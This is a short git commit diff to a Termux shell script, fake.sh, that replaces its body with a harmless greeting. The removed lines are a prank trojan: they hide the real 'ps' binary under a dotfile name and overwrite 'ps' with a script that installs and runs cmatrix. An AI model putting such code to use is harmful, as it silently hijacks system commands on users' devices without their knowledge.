0cbf9c2b300f5a189f73abb56f1bfb4e2bf7fa4a
WatashiSenseiGalirus <58677185+WatashiSenseiGalirus@users.noreply.github.com>
2026-02-19 10:06:59 +0700

    Update fake.sh

--- fake.sh
+++ fake.sh
@@ -1,9 +1,4 @@
 #!/bin/bash
-PSBIN="/data/data/com.termux/files/usr/bin/ps"
-PSREAL="/data/data/com.termux/files/usr/bin/.galirus_senpai.real"
-if [ -x "$PSBIN" ] && [ ! -x "$PSREAL" ]; then
-   mv "$PSBIN" "$PSREAL"
-fi
-cat > "$PSBIN" << 'EOF'
-pkg install cmatrix
-cmatrix -a -b -C red -s 10
+echo "halo bung" 
+
+read
